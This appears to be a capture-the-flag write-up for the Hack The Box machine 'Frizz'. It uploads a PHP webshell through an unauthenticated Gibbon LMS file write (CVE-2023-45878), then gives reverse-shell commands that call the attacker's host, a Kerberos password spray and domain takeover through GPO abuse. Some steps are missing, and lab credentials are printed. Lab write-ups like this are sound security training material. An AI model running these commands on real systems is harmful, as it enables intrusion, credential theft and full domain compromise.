## CVE-2023-45878 — Unauthenticated Arbitrary File Write

A quick search on that version leads to a [usd HeroLab advisory](https://herolab.usd.de/security-advisories/usd-2023-0025/) — `rubrics_visualise_saveAjax.php` accepts file uploads without any authentication check. We can write arbitrary content anywhere the web server has write access.

The plan: base64-encode a PHP webshell and write it to the webroot.

```bash
echo '<?php system($_REQUEST["cmd"]); ?>' | base64
PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsiY21kIl0pOyA/Pgo=
```

```bash
curl -X POST "http://frizzdc.frizz.htb/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php" \
  --data "img=image/png;new,PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsiY21kIl0pOyA/Pgo=%2b" \
  --data "path=new.php" \
  --data "gibbonPersonID=00000000"
```

Test execution:

```bash
curl -G --data-urlencode "cmd=whoami" 'http://frizzdc.frizz.htb/Gibbon-LMS/new.php'
```

```text
frizz\w.webservice
```

We have code execution. Easiest path to a shell — upload nc.exe and call back:

```bash
curl -G --data-urlencode "cmd=curl http://10.10.14.161/nc.exe -o C:/programdata/nc.exe" 'http://frizzdc.frizz.htb/Gibbon-LMS/new.php'
curl -G --data-urlencode "cmd=C:/programdata/nc.exe 10.10.14.161 4444 -e cmd.exe" 'http://frizzdc.frizz.htb/Gibbon-LMS/new.php'
```

```bash
cat tmp | tr ' ' '\n' | tr -s '\n' > users.txt
```

NTLM is disabled on this box so we spray via Kerberos with kerbrute:

```bash
kerbrute passwordspray -d frizz.htb --dc frizzdc.frizz.htb users.txt Jenni_Luvs_Magic23
```

```text
[+] VALID LOGIN:  f.frizzle@frizz.htb:Jenni_Luvs_Magic23
```

![kerbrute-spray](/assets/img/frizz/kerbrute-spray.png)

No WinRM but SSH is open. Since NTLM is disabled we need Kerberos auth for SSH — generate the krb5 config and get a TGT:

```bash
nxc smb 10.129.17.23 --generate-krb5-file thefrizz.krb5
sudo mv thefrizz.krb5 /etc/krb5.conf
getTGT.py frizz.htb/f.frizzle:'Jenni_Luvs_Magic23' -dc-ip 10.129.17.23
export KRB5CCNAME=f.frizzle.ccache
ssh -o GSSAPIAuthentication=yes -o GSSAPIKeyExchange=yes f.frizzle@frizzdc.frizz.htb
```

## BloodHound & Manual Enumeration

```bash
rusthound-ce -d frizz.htb -f frizzdc.frizz.htb -k -c All --zip
```

No interesting ACLs or attack paths for `f.frizzle`. Shift to manual enumeration — scheduled tasks, services, writable paths. Nothing obvious until checking the recycle bin:

```powershell
PS C:\$RECYCLE.BIN> gci -force -r
```

```text
Directory: C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103

Mode          LastWriteTime      Length  Name
----          -------------      ------  ----
-a---  10/29/2024  7:31 AM         148  $IE2XMEG.7z
-a---  10/24/2024  9:16 PM    30416987  $RE2XMEG.7z
```

A 30MB 7z archive sitting in the bin. The `$R` file is the actual content, `$I` stores the original path metadata. Recover the original filename using the Shell.Application COM object:

```powershell
PS C:\$RECYCLE.BIN> $shell = New-Object -ComObject Shell.Application
PS C:\$RECYCLE.BIN> $shell.Namespace(0xA).Items() | Select-Object Name, Path, ModifyDate, Size, Type
```

```text
Name       : wapt-backup-sunday.7z
Path       : C:\$RECYCLE.BIN\S-1-5-21-...\$RE2XMEG.7z
ModifyDate : 10/24/2024 8:16:29 PM
Size       : 30416987
Type       : 7Z File
```

`wapt-backup-sunday.7z` — WAPT is a Python-based software deployment and endpoint management tool, basically a lightweight SCCM alternative. Configuration files in a backup like this are worth reading carefully.

```powershell
PS C:\$RECYCLE.BIN> Copy-Item 'C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103\$RE2XMEG.7z' C:\programdata\wapt-backup-sunday.7z
```

```bash
scp -O -o GSSAPIAuthentication=yes f.frizzle@frizzdc.frizz.htb:'C:/programdata/wapt-backup-sunday.7z' .
7z x wapt-backup-sunday.7z
```

## Privilege Escalation — GPO Abuse → SYSTEM

Get a TGT and SSH in as `M.SchoolBus`:

```bash
getTGT.py frizz.htb/M.SchoolBus:'!suBcig@MehTed!R' -dc-ip 10.129.17.23
export KRB5CCNAME=M.SchoolBus.ccache
ssh -o GSSAPIAuthentication=yes -o GSSAPIKeyExchange=yes M.SchoolBus@frizzdc.frizz.htb
```

Back in BloodHound with these new creds — `M.SchoolBus` is a member of **GROUP POLICY CREATOR OWNERS**.

![bloodhound-gpocreator](/assets/img/frizz/bloodhound-gpocreator.png)

Members of this group can create new GPOs and link them to OUs. Combined with the ability to link to the domain root, that means we can push arbitrary policy to every machine in the domain. We'll use SharpGPOAbuse to add `M.SchoolBus` as a local admin on the DC.

Transfer the binary:

```bash
scp -O -o GSSAPIAuthentication=yes SharpGPOAbuse.exe m.schoolbus@frizzdc.frizz.htb:'C:/programdata/SharpGPOAbuse.exe'
```

Create the GPO, link it to the domain, and exploit it:

```powershell
PS C:\ProgramData> New-GPO -Name "pwn3d" | New-GPLink -Target "DC=frizz,DC=htb"
PS C:\ProgramData> .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount m.schoolbus --GPOName "pwn3d"
PS C:\ProgramData> gpupdate /force
```

![gpoupdate](/assets/img/frizz/gpoupdate.png)

Verify with nxc:

```bash
nxc smb frizzdc.frizz.htb -u M.SchoolBus -p '!suBcig@MehTed!R' -k
```

```text
SMB  frizzdc.frizz.htb  445  frizzdc  [+] frizz.htb\M.SchoolBus:!suBcig@MehTed!R (Pwn3d!)
```

Get a fresh ticket and psexec in:

```bash
getTGT.py frizz.htb/M.SchoolBus:'!suBcig@MehTed!R' -dc-ip 10.129.17.23
export KRB5CCNAME=M.SchoolBus.ccache
psexec.py -k -no-pass M.SchoolBus@frizzdc.frizz.htb
```

```text
C:\Windows\system32> whoami

```
